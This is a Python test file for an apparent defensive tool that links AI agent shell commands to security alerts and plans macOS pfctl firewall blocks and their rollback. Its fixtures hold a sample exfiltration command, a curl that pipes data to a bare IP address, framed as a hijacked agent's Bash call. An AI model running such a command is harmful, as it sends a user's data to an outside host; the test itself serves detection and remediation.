"""Item 9: macOS pf adapter. A bare-IP exfil target on macOS is blocked with a pfctl anchor rule
(shell-gated), and the undo flushes that anchor."""

from datetime import UTC, datetime

from alibi.alerts import Alert
from alibi.link import LinkResult
from alibi.remediate import apply_remediations, plan_remediations, rollback_bundle
from alibi.transcript import ToolCall
from alibi.verdict import Disposition, Tier, Verdict, VerdictKind

TS = datetime(2026, 1, 1, tzinfo=UTC)


def _v(cmd, reason):
    call = ToolCall(TS, "t1", "Bash", {"command": cmd}, r"C:\proj")
    link = LinkResult(call, "linked", 0.9)
    alert = Alert(timestamp=TS, rule_title="r", level="high", computer="PC", channel="Sysmon",
                  event_id=1, record_id="1", rule_id="r", mitre_techniques=(), command_line=cmd)
    return Verdict(alert, link, Disposition.VERDICT, VerdictKind.HIJACKED, 0.85, reason, Tier.POLICY, (), ())


def _block(rems):
    return next(r for r in rems if r.action == "block_ip")


def test_macos_pf_block():
    b = _block(plan_remediations([_v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")], target_os="macos"))
    assert "pfctl" in b.command and b.target == "203.0.113.9"
    assert b.automatic and b.needs_shell and b.argv is None


def test_macos_pf_undo_flushes_anchor():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    applied = apply_remediations(plan_remediations([v], target_os="macos"), approver=lambda r: True, executor=[].append)
    step = next(s for s in rollback_bundle(applied, target_os="macos") if s.action == "unblock_ip")
    assert "pfctl -a com.alibi/block -F rules" in step.command
